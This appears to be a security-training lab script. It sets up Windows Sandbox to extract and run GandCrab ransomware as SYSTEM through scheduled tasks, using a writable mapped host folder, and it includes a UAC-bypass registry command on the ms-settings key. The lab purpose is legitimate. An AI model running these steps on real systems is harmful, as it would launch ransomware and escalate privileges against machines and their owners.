url.address=\* NOT (url.address contains ('Microsoft', 'bing','msedge','msn','live','sfx','Windows','office','))

&nbsp;

&nbsp;

reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v "DelegateExecute" /d "" /f

&nbsp;

&nbsp;

Enable-WindowsOptionalFeature -FeatureName "Containers-DisposableClientVM" -All -Online -NoRestart

#download gc.zip

#https://sentinelone.sharefile.com/public/share/web-s6b761fac698e4da5aec84bc8d36eae7c

\$rootPath = 'C:\\Users\\Student\\'  
Copy-Item 'C:\\Program Files\\7-Zip\\7z.\*' \$rootPath  
\$bat = @'  
@echo off  
C:\\Victim\\7z.exe x C:\\Victim\\gc.zip -oC:\\vault -pinfected -y  
schtasks /create /tn sb /tr "C:\\vault\\GandCrab.exe" /sc hourly /st 08:30 /ru system /f  
schtasks /run /tn sb  
'@  
New-Item -Path \$rootPath -Name 'run.bat' -ItemType File -Value \$bat  
\$wsb = @'  
&lt;Configuration&gt;  
 &lt;Networking&gt;Enable&lt;/Networking&gt;  
  &lt;MappedFolders&gt;  
    &lt;MappedFolder&gt;  
    &lt;HostFolder&gt;C:\\Users\\Student&lt;/HostFolder&gt;  
    &lt;SandboxFolder&gt;C:\\Victim&lt;/SandboxFolder&gt;  
    &lt;ReadOnly&gt;false&lt;/ReadOnly&gt;  
    &lt;/MappedFolder&gt;  
  &lt;/MappedFolders&gt;  
  &lt;LogonCommand&gt;  
    &lt;Command&gt;C:\\Victim\\run.bat&lt;/Command&gt;  
  &lt;/LogonCommand&gt;  
  &lt;MemoryInMB&gt;1024&lt;/MemoryInMB&gt;  
&lt;/Configuration&gt;  
'@  
New-Item -Path \$rootPath -Name 'sb.wsb' -ItemType File -Value \$wsb

\$taskName = "sb"  
\$wsbPath = "\$rootPath" + "sb.wsb"  
\$taskAction = New-ScheduledTaskAction -Execute 'C:\\Windows\\System32\\WindowsSandbox.exe' -Argument \$wsbPath  
\$taskTrigger = New-ScheduledTaskTrigger -AtStartup  
\$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\\SYSTEM" -RunLevel Highest

Register-ScheduledTask -TaskName \$taskName -Action \$taskAction -Trigger \$taskTrigger -Principal \$principal  
Restart-Computer -Force